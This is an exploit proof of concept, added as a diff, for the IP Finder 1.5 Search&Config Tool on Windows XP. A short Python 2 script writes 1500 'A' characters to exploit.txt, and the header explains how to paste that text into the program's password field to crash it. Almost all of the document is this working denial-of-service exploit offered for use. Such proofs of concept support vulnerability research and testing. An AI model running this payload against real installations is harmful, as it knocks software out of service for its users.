@@ -1,0 +1,25 @@
+# Exploit Title: IP Finder 1.5 - Denial of Service (PoC)  
+# Author: Shubham Singh
+# Known As: Spirited Wolf [Twitter: @Pwsecspirit]
+# Discovey Date: 2018-08-12
+# Software Link: https://securimport.com/university/index.php/videovigilancia-ip/software/429-ip-finder
+# Tested Version: 1.5
+# Tested on OS: Windows XP Service Pack 3 x86
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the Search&Config Tool program paste the content of 
+# "exploit.txt" in password field. You will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 1500
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
